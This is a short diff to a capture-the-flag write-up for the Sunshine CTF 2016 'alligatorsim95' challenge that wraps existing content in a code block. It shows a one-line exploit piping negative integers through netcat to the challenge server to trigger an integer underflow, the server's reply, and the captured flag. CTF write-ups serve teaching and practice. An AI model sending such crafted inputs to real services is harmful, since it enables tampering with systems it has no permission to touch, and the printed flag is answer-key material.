@@ -5,6 +5,7 @@ tags:    [Write-up, Sunshine CTF 2016]
 summary: "Write-up about Sunshine CTF 2016 - alligatorsim95"
 ---
 
+```
 ➜  Desktop python -c "print -1337; print -0xffffffff; print -1" | nc 4.31.182.242 9000 # integer underflow
               .-._   _ _ _ _ _ _ _ _
    .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
@@ -30,3 +31,4 @@ summary: "Write-up about Sunshine CTF 2016 - alligatorsim95"
 -> dang 2147483647 is a lotta eggs
 -> as a god among gators here is ur crown:
 sun{int_0verflow_i5_a_g0od_st4rt}
+```
